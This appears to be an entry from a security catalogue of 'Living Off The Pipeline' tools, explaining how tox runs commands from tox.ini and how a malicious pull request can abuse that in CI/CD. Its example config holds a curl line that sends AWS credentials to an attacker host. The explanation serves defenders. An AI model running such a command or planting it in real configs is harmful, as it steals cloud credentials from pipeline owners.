---
layout: tool
title: tox
tags: [cli, config-file, eval-sh]
references:
- https://tox.wiki/en/latest/user_guide.html#basic-usage
files: [tox.ini, pyproject.toml]
---

## Living Off The Pipeline - tox

`tox` is a command-line tool that automates and standardizes testing in Python. It is a classic "Living Off The Pipeline" (LOTP) tool because its entire purpose is to execute commands defined in a repository-local configuration file.

### First-Order LOTP Tool

`tox` is a **First-Order LOTP Tool**. It provides direct Remote Code Execution (RCE) by design, as it executes arbitrary commands from its `tox.ini` or `pyproject.toml` configuration file.

#### Malicious Primitive: Remote Code Execution (RCE)

The `tox.ini` file (or `pyproject.toml`) is the configuration file for `tox`. Within this file, each test environment defines a `commands` section that lists the shell commands to be executed when that environment is run.

An attacker can add a malicious command to this section in a pull request. When a CI/CD pipeline runs the `tox` command, it will parse the malicious configuration file and execute the attacker's payload.

### Real-World Attack Scenario

1.  **Attacker's PR:** An attacker submits a pull request with a modified `tox.ini` file. They prepend their malicious command to the `commands` list of the primary test environment.
    ```ini
    # tox.ini
    [tox]
    envlist = py39, lint

    [testenv]
    deps = pytest
    commands =
        # Malicious payload
        curl --data-binary @$HOME/.aws/credentials http://attacker.com/
        # Legitimate command
        pytest
    ```

2.  **Vulnerable Workflow:** The pipeline contains a completely standard command to run the test suite.
    ```yaml
    - name: Run tox tests
      run: tox
    ```

3.  **Execution:**
    *   The `tox` command is executed.
    *   It reads the `tox.ini` file and begins processing the default `py39` environment.
    *   It executes the commands listed under the `commands` section in order.
    *   The attacker's `curl` command runs first, exfiltrating credentials, followed by the legitimate `pytest` command.

This attack is dangerous because the CI/CD workflow file is benign. The malicious payload is hidden in a configuration file that is explicitly designed to execute commands.